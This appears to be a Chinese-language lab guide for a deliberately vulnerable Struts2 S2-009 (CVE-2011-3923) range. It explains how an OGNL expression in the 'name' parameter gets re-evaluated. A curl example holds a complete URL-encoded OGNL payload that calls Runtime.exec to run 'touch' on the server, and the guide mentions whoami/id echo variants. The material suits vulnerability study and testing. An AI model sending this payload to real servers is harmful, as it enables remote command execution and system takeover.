# struts2-s2-009 操作教程

- 类型：单体靶场
- 目录：`struts2-s2-009`
- 端口：`9961`
- 推荐入口：`/example5.action`

## 这是什么

Struts2 `S2-009 / CVE-2011-3923` 演示靶场。思路是先让 `name` 进入 Action 上下文，再通过额外参数 `z[(name)('meh')]` 触发二次求值，从而绕过对 `#`、`\` 等特殊字符的早期限制。

## 启动前准备

1. 在仓库根目录执行 `bash run-local-build.sh`。
2. 等待对应容器启动完成，并确认端口 `9961` 已经监听。
3. 如果你还想通过首页统一发包，再额外确认 `http://宿主机IP:5000/` 能打开。

## 方式一：通过页面点击测试

1. 打开 `http://宿主机IP:9961/example5.action`。
2. 先点 `回显 whoami` 或 `回显 id`，页面会把表达式填进 `name`。
3. 点击 `重放 S2-009 Payload`，观察是否直接有命令结果或 `/tmp` 侧效果。

## 方式二：通过首页测试

1. 打开 `http://宿主机IP:5000/`。
2. 在搜索框输入 `struts2_s2_009、s2-009、struts2` 过滤到当前项目。
3. 推荐先跑 `struts2_s2_009_attack_touch`。
4. 再跑 `struts2_s2_009_normal` 看基线页面。

推荐直接使用的首页条目：
- `struts2_s2_009_attack_touch`：通过 `name` 二次求值执行 `touch /tmp/struts2-s2-009-success`
- `struts2_s2_009_normal`：页面基线访问

## 方式三：直接访问接口测试

1. 执行 `touch`：

```bash
curl -i "http://宿主机IP:9961/example5.action?age=12313&name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dnew+java.lang.Boolean%28false%29%2C+%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dnew+java.lang.Boolean%28true%29%2C+%40java.lang.Runtime%40getRuntime%28%29.exec%28%27touch+%2Ftmp%2Fstruts2-s2-009-success%27%29%29%28meh%29&z%5B%28name%29%28%27meh%27%29%5D=true"
```

2. 基线访问：

```bash
curl -i "http://宿主机IP:9961/example5.action?age=18&name=demo"
```

## 测试时重点看什么

1. `name` 是否先进入上下文。
2. `z[(name)('meh')]` 是否把 `name` 当成表达式再次执行。
3. 基线请求是否只正常渲染页面，不触发额外执行。

## 相关入口

- 总控台：`http://宿主机IP:5000/`
- 文档索引：[`doc/README.md`](../README.md)
- 根项目说明：[`README.md`](../../README.md)
